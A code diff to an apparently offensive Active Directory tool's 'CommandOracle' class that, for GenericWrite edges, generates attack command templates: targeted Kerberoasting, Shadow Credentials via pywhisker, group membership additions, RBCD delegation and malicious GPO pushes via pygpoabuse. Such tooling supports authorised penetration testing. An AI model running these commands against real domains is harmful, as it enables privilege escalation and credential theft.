@@ -188,12 +188,71 @@ class CommandOracle:
                 )
 
         # GenericWrite / CanGenericWrite
-        if normalized_edge == "GenericWrite" or normalized_edge == "CanGenericWrite":
+        if normalized_edge in ("GenericWrite", "CanGenericWrite"):
             target_object = target.name or target.id or "<TARGET_OBJECT>"
+            target_name_l = target_object.casefold()
+
+            if target.node_type == "user":
+                return (
+                    f"# GenericWrite on USER: common abuses\n"
+                    f"# 1) Targeted Kerberoast by writing SPN\n"
+                    f"bloodyAD --host <DC_IP> -d {domain} -u {username}{auth_part} "
+                    f"set object '{target_object}' servicePrincipalName -v 'HTTP/{target_object}'\n"
+                    f"impacket-GetUserSPNs -dc-ip <DC_IP> -request {domain}/{username}{auth_part}\n"
+                    f"# 2) Shadow Credentials (msDS-KeyCredentialLink)\n"
+                    f"pywhisker -d {domain} -u {username}{auth_part} "
+                    f"--target '{target_object}' --action add"
+                )
+
+            if target.node_type == "group":
+                return (
+                    f"# GenericWrite on GROUP: add controlled principal to group\n"
+                    f"net rpc group addmem '{target_object}' '<CONTROLLED_USER>' "
+                    f"-U '{domain}/{username}%<PASSWORD_OR_HASH>' -S <DC_HOST>\n"
+                    f"# or\n"
+                    f"bloodyAD --host <DC_IP> -d {domain} -u {username}{auth_part} "
+                    f"add groupMember '{target_object}' '<CONTROLLED_USER>'"
+                )
+
+            if target.node_type == "computer":
+                return (
+                    f"# GenericWrite on COMPUTER: common abuses\n"
+                    f"# 1) Shadow Credentials via msDS-KeyCredentialLink\n"
+                    f"pywhisker -d {domain} -u {username}{auth_part} "
+                    f"--target '{target_object}' --action add\n"
+                    f"# 2) RBCD path (set msDS-AllowedToActOnBehalfOfOtherIdentity)\n"
+                    f"impacket-rbcd{auth_part} -dc-ip <DC_IP> -action write "
+                    f"-delegate-from '<CONTROLLED_COMPUTER>$' -delegate-to '{target_object}' "
+                    f"{domain}/{username}"
+                )
+
+            # Heuristic handling for object classes we do not explicitly model yet.
+            if "cn=" in target_name_l and "policies" in target_name_l:
+                return (
+                    f"# GenericWrite on GPO: push malicious policy\n"
+                    f"pygpoabuse -d {domain} -u {username}{auth_part} --gpo-id '<GPO_GUID>' "
+                    f"--command '<PAYLOAD_COMMAND>'\n"
+                    f"# Also consider SharpGPOAbuse on Windows"
+                )
+
+            if target_name_l.startswith("ou="):
+                return (
+                    f"# GenericWrite on OU: abuse gPLink to apply attacker-controlled GPO\n"
+                    f"# Follow WriteGPLink abuse flow against this OU\n"
+                    f"# Target OU: {target_object}"
+                )
+
+            if target.node_type == "domain" or target_name_l.startswith("dc="):
+                return (
+                    f"# GenericWrite on DOMAIN: abuse gPLink at domain root\n"
+                    f"# Follow WriteGPLink abuse flow to impact many principals\n"
+                    f"# Target domain object: {target_object}"
+                )
+
             return (
-                f"impacket-dacledit{auth_part} -action write -rights GenericWrite "
-                f"-principal '{username}' -target '{target_object}' {domain}/{username}\n"
-                f"# GenericWrite may allow: password reset (user), spn modification (computer), etc."
+                f"# GenericWrite on {target.node_type or 'object'}: writeable attributes depend on object class\n"
+                f"# Target: {target_object}\n"
+                f"# Enumerate writeable attrs and pick abuse path (SPN, msDS-KeyCredentialLink, group membership, gPLink, ADCS attrs)"
             )
 
         # Owns
